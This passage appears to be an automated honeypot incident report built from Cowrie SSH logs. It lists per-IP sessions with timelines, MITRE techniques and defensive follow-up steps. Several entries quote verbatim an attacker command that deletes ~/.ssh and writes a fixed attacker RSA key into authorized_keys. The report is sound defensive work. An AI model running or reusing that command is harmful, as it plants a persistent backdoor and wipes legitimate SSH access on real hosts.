- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a6303a8d5f

| Field | Detail |
|---|---|
| **Source IP** | `34.40.145[.]110` |
| **First Seen** | 2026-07-10 18:34 |
| **Last Seen** | 2026-07-10 18:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:34:57` | `cowrie.session.connect` |
| `2026-07-10 18:34:57` | `cowrie.client.version` |
| `2026-07-10 18:34:57` | `cowrie.client.kex` |
| `2026-07-10 18:34:58` | `cowrie.login.success` |
| `2026-07-10 18:34:59` | `cowrie.session.params` |
| `2026-07-10 18:34:59` | `cowrie.command.input` |
| `2026-07-10 18:34:59` | `cowrie.command.failed` |
| `2026-07-10 18:34:59` | `cowrie.log.closed` |
| `2026-07-10 18:35:00` | `cowrie.session.params` |
| `2026-07-10 18:35:00` | `cowrie.command.input` |
| `2026-07-10 18:35:00` | `cowrie.session.file_download` |
| `2026-07-10 18:35:00` | `cowrie.log.closed` |
| `2026-07-10 18:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.40.145[.]110` to AbuseIPDB if not already reported
- [ ] Block `34.40.145[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f3d29bc938

| Field | Detail |
|---|---|
| **Source IP** | `34.40.145[.]110` |
| **First Seen** | 2026-07-10 18:35 |
| **Last Seen** | 2026-07-10 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:35:00` | `cowrie.session.connect` |
| `2026-07-10 18:35:00` | `cowrie.client.version` |
| `2026-07-10 18:35:01` | `cowrie.client.kex` |
| `2026-07-10 18:35:01` | `cowrie.login.success` |
| `2026-07-10 18:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.40.145[.]110` to AbuseIPDB if not already reported
- [ ] Block `34.40.145[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da08ea3ef712

| Field | Detail |
|---|---|
| **Source IP** | `34.40.145[.]110` |
| **First Seen** | 2026-07-10 18:35 |
| **Last Seen** | 2026-07-10 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:35:02` | `cowrie.session.connect` |
| `2026-07-10 18:35:02` | `cowrie.client.version` |
| `2026-07-10 18:35:02` | `cowrie.client.kex` |
| `2026-07-10 18:35:03` | `cowrie.login.success` |
| `2026-07-10 18:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.40.145[.]110` to AbuseIPDB if not already reported
- [ ] Block `34.40.145[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ce7d96259b2

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-07-10 18:36 |
| **Last Seen** | 2026-07-10 18:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:36:14` | `cowrie.session.connect` |
| `2026-07-10 18:36:14` | `cowrie.client.version` |
| `2026-07-10 18:36:15` | `cowrie.client.kex` |
| `2026-07-10 18:36:15` | `cowrie.login.success` |
| `2026-07-10 18:36:16` | `cowrie.session.params` |
| `2026-07-10 18:36:16` | `cowrie.command.input` |
| `2026-07-10 18:36:16` | `cowrie.command.failed` |
| `2026-07-10 18:36:17` | `cowrie.log.closed` |
| `2026-07-10 18:36:18` | `cowrie.session.params` |
| `2026-07-10 18:36:18` | `cowrie.command.input` |
| `2026-07-10 18:36:18` | `cowrie.session.file_download` |
| `2026-07-10 18:36:18` | `cowrie.log.closed` |
| `2026-07-10 18:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fb7bb26472

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-07-10 18:36 |
| **Last Seen** | 2026-07-10 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:36:18` | `cowrie.session.connect` |
| `2026-07-10 18:36:18` | `cowrie.client.version` |
| `2026-07-10 18:36:18` | `cowrie.client.kex` |
| `2026-07-10 18:36:19` | `cowrie.login.success` |
| `2026-07-10 18:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-068beb91a8f1

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-07-10 18:36 |
| **Last Seen** | 2026-07-10 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:36:19` | `cowrie.session.connect` |
| `2026-07-10 18:36:19` | `cowrie.client.version` |
| `2026-07-10 18:36:20` | `cowrie.client.kex` |
| `2026-07-10 18:36:21` | `cowrie.login.success` |
| `2026-07-10 18:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6897feb40faf

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-07-10 18:39 |
| **Last Seen** | 2026-07-10 18:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:39:04` | `cowrie.session.connect` |
| `2026-07-10 18:39:05` | `cowrie.client.version` |
| `2026-07-10 18:39:05` | `cowrie.client.kex` |
| `2026-07-10 18:39:09` | `cowrie.login.success` |
| `2026-07-10 18:39:10` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ab8acdc53a

| Field | Detail |
|---|---|
| **Source IP** | `24.187.213[.]29` |
| **First Seen** | 2026-07-10 18:40 |
| **Last Seen** | 2026-07-10 18:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:40:41` | `cowrie.session.connect` |
| `2026-07-10 18:40:41` | `cowrie.client.version` |
| `2026-07-10 18:40:41` | `cowrie.client.kex` |
| `2026-07-10 18:40:42` | `cowrie.login.success` |
| `2026-07-10 18:40:43` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.187.213[.]29` to AbuseIPDB if not already reported
- [ ] Block `24.187.213[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96032b3ea9ea

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-07-10 18:40 |
| **Last Seen** | 2026-07-10 18:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:40:48` | `cowrie.session.connect` |
| `2026-07-10 18:40:48` | `cowrie.client.version` |
| `2026-07-10 18:40:48` | `cowrie.client.kex` |
| `2026-07-10 18:40:49` | `cowrie.login.success` |
| `2026-07-10 18:40:50` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0403037c0ab4

| Field | Detail |
|---|---|
| **Source IP** | `41.93.82[.]201` |
| **First Seen** | 2026-07-10 18:41 |
| **Last Seen** | 2026-07-10 18:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:41:55` | `cowrie.session.connect` |
| `2026-07-10 18:41:55` | `cowrie.client.version` |
| `2026-07-10 18:41:55` | `cowrie.client.kex` |
| `2026-07-10 18:41:56` | `cowrie.login.success` |
| `2026-07-10 18:41:57` | `cowrie.session.params` |
| `2026-07-10 18:41:57` | `cowrie.command.input` |
| `2026-07-10 18:41:57` | `cowrie.command.failed` |
| `2026-07-10 18:41:58` | `cowrie.log.closed` |
| `2026-07-10 18:41:59` | `cowrie.session.params` |
| `2026-07-10 18:41:59` | `cowrie.command.input` |
| `2026-07-10 18:41:59` | `cowrie.session.file_download` |
| `2026-07-10 18:41:59` | `cowrie.log.closed` |
| `2026-07-10 18:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.82[.]201` to AbuseIPDB if not already reported
- [ ] Block `41.93.82[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5582c3f2cbf

| Field | Detail |
|---|---|
| **Source IP** | `41.93.82[.]201` |
| **First Seen** | 2026-07-10 18:41 |
| **Last Seen** | 2026-07-10 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:41:59` | `cowrie.session.connect` |
| `2026-07-10 18:41:59` | `cowrie.client.version` |
| `2026-07-10 18:42:00` | `cowrie.client.kex` |
| `2026-07-10 18:42:01` | `cowrie.login.success` |
| `2026-07-10 18:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.82[.]201` to AbuseIPDB if not already reported
- [ ] Block `41.93.82[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56690f5f86f

| Field | Detail |
|---|---|
| **Source IP** | `41.93.82[.]201` |
| **First Seen** | 2026-07-10 18:42 |
| **Last Seen** | 2026-07-10 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:42:01` | `cowrie.session.connect` |
| `2026-07-10 18:42:01` | `cowrie.client.version` |
| `2026-07-10 18:42:02` | `cowrie.client.kex` |
| `2026-07-10 18:42:03` | `cowrie.login.success` |
| `2026-07-10 18:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.82[.]201` to AbuseIPDB if not already reported
- [ ] Block `41.93.82[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b55405bdca9

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-10 18:42 |
| **Last Seen** | 2026-07-10 18:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:42:44` | `cowrie.session.connect` |
| `2026-07-10 18:42:44` | `cowrie.client.version` |
| `2026-07-10 18:42:44` | `cowrie.client.kex` |
| `2026-07-10 18:42:46` | `cowrie.login.success` |
| `2026-07-10 18:42:47` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bbf538df860

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]205` |
| **First Seen** | 2026-07-10 18:42 |
| **Last Seen** | 2026-07-10 18:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:42:56` | `cowrie.session.connect` |
| `2026-07-10 18:42:57` | `cowrie.client.version` |
| `2026-07-10 18:42:57` | `cowrie.client.kex` |
| `2026-07-10 18:42:59` | `cowrie.login.success` |
| `2026-07-10 18:43:00` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]205` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72627db86938

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]121` |
| **First Seen** | 2026-07-10 18:44 |
| **Last Seen** | 2026-07-10 18:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:44:00` | `cowrie.session.connect` |
| `2026-07-10 18:44:00` | `cowrie.client.version` |
| `2026-07-10 18:44:01` | `cowrie.client.kex` |
| `2026-07-10 18:44:01` | `cowrie.login.success` |
| `2026-07-10 18:44:02` | `cowrie.session.params` |
| `2026-07-10 18:44:02` | `cowrie.command.input` |
| `2026-07-10 18:44:02` | `cowrie.command.failed` |
| `2026-07-10 18:44:03` | `cowrie.log.closed` |
| `2026-07-10 18:44:04` | `cowrie.session.params` |
| `2026-07-10 18:44:04` | `cowrie.command.input` |
| `2026-07-10 18:44:04` | `cowrie.session.file_download` |
| `2026-07-10 18:44:04` | `cowrie.log.closed` |
| `2026-07-10 18:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]121` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7915eab5d29

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]121` |
| **First Seen** | 2026-07-10 18:44 |
| **Last Seen** | 2026-07-10 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:44:04` | `cowrie.session.connect` |
| `2026-07-10 18:44:04` | `cowrie.client.version` |
| `2026-07-10 18:44:04` | `cowrie.client.kex` |
| `2026-07-10 18:44:05` | `cowrie.login.success` |
| `2026-07-10 18:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]121` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16aa3b0a25dc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]121` |
| **First Seen** | 2026-07-10 18:44 |
| **Last Seen** | 2026-07-10 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:44:05` | `cowrie.session.connect` |
| `2026-07-10 18:44:05` | `cowrie.client.version` |
| `2026-07-10 18:44:06` | `cowrie.client.kex` |
| `2026-07-10 18:44:07` | `cowrie.login.success` |
| `2026-07-10 18:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]121` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582c2982eedd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 18:45 |
| **Last Seen** | 2026-07-10 18:45 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:45:08` | `cowrie.session.connect` |
| `2026-07-10 18:45:10` | `cowrie.client.version` |
| `2026-07-10 18:45:10` | `cowrie.client.kex` |
| `2026-07-10 18:45:16` | `cowrie.login.success` |
| `2026-07-10 18:45:22` | `cowrie.session.params` |
| `2026-07-10 18:45:22` | `cowrie.command.input` |
| `2026-07-10 18:45:23` | `cowrie.log.closed` |
| `2026-07-10 18:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77553cecc6f5

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-10 18:47 |
| **Last Seen** | 2026-07-10 18:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:47:08` | `cowrie.session.connect` |
| `2026-07-10 18:47:09` | `cowrie.client.version` |
| `2026-07-10 18:47:09` | `cowrie.client.kex` |
| `2026-07-10 18:47:11` | `cowrie.login.success` |
| `2026-07-10 18:47:12` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-870867aa136b

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-10 18:47 |
| **Last Seen** | 2026-07-10 18:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:47:17` | `cowrie.session.connect` |
| `2026-07-10 18:47:18` | `cowrie.client.version` |
| `2026-07-10 18:47:18` | `cowrie.client.kex` |
| `2026-07-10 18:47:20` | `cowrie.login.success` |
| `2026-07-10 18:47:20` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de6cceb94af

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-07-10 18:47 |
| **Last Seen** | 2026-07-10 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:47:34` | `cowrie.session.connect` |
| `2026-07-10 18:47:34` | `cowrie.client.version` |
| `2026-07-10 18:47:35` | `cowrie.client.kex` |
| `2026-07-10 18:47:35` | `cowrie.login.success` |
| `2026-07-10 18:47:36` | `cowrie.session.params` |
| `2026-07-10 18:47:36` | `cowrie.command.input` |
| `2026-07-10 18:47:36` | `cowrie.command.failed` |
| `2026-07-10 18:47:36` | `cowrie.log.closed` |
| `2026-07-10 18:47:37` | `cowrie.session.params` |
| `2026-07-10 18:47:37` | `cowrie.command.input` |
| `2026-07-10 18:47:37` | `cowrie.session.file_download` |
| `2026-07-10 18:47:37` | `cowrie.log.closed` |
| `2026-07-10 18:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3374cde529

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-07-10 18:47 |
| **Last Seen** | 2026-07-10 18:47 |
| **Session Duration** | 0s |
